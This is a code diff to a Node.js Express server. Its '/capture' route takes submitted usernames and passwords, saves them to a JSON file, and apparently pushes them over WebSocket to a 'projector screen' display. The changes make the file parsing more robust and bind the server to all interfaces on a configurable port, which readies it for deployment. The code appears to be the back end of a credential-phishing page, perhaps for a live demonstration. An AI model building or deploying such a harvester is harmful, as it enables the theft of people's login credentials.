@@ -2,7 +2,7 @@ const express = require('express');
 const http = require('http');
 const { WebSocketServer } = require('ws');
 const path = require('path');
-const fs = require('fs'); // Memory save karne ke liye
+const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
@@ -34,13 +34,21 @@ app.post('/capture', (req, res) => {
         }
     });
 
-    // 2. MEMORY: Data ko file mein save karo
+    // 2. MEMORY: Data ko file mein save karo (Safe Method)
     const newData = { time, username, password };
     let existingData = [];
 
     if (fs.existsSync(dataFile)) {
-        const fileContent = fs.readFileSync(dataFile, 'utf8');
-        existingData = JSON.parse(fileContent || '[]');
+        try {
+            const fileContent = fs.readFileSync(dataFile, 'utf8');
+            // Agar file khali nahi hai, toh data parho
+            if (fileContent && fileContent.trim() !== '') {
+                existingData = JSON.parse(fileContent);
+            }
+        } catch (error) {
+            console.log("[-] JSON Error: Purani file kharab thi, nayi bana rahe hain.");
+            existingData = [];
+        }
     }
     
     existingData.push(newData);
@@ -70,7 +78,7 @@ wss.on('connection', (ws) => {
     console.log('Projector screen connected');
 });
 
-const PORT = 3000;
-server.listen(PORT, () => {
-    console.log(`Server running: http://localhost:${PORT}`);
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, '0.0.0.0', () => {
+    console.log(`Server running on port ${PORT}`);
 });
